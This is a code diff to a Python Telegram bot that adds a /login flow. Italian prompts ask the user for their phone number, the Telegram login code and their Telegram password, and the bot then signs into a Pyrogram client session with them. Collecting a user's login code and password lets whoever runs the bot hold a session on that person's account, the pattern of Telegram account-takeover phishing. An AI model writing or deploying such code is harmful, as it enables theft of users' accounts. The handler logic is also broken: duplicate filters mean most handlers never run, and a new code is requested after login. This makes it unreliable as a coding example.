@@ -142,13 +142,38 @@ def inlinequery(update: Update, context: CallbackContext) -> None:
 
     update.inline_query.answer(results)
 
+def login(update: Update, context: CallbackContext) -> None:
+    update.message.reply_text('Inserisci il tuo numero di telefono:')
+
+def phone_number(update: Update, context: CallbackContext) -> None:
+    phone_number = update.message.text
+    context.user_data['phone_number'] = phone_number
+    update.message.reply_text('Inserisci il codice di accesso che hai ricevuto da Telegram:')
+
+def access_code(update: Update, context: CallbackContext) -> None:
+    access_code = update.message.text
+    context.user_data['access_code'] = access_code
+    update.message.reply_text('Inserisci la tua password di Telegram:')
+
+def password(update: Update, context: CallbackContext) -> None:
+    password = update.message.text
+    phone_number = context.user_data['phone_number']
+    access_code = context.user_data['access_code']
+    with Client("my_account", api_id=API_ID, api_hash=API_HASH, phone_number=phone_number) as app:
+        app.send_code(phone_number)
+        app.sign_in(phone_number, access_code, password)
+    update.message.reply_text('Accesso effettuato con successo!')
+
 def main() -> None:
     updater = Updater(token=TOKEN)
 
     dispatcher = updater.dispatcher
 
     dispatcher.add_handler(CommandHandler("start", start))
-    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, echo))
+    dispatcher.add_handler(CommandHandler("login", login))
+    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, phone_number, pass_user_data=True))
+    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, access_code, pass_user_data=True))
+    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, password, pass_user_data=True))
     dispatcher.add_handler(CallbackQueryHandler(button))
     dispatcher.add_handler(InlineQueryHandler(inlinequery))
 
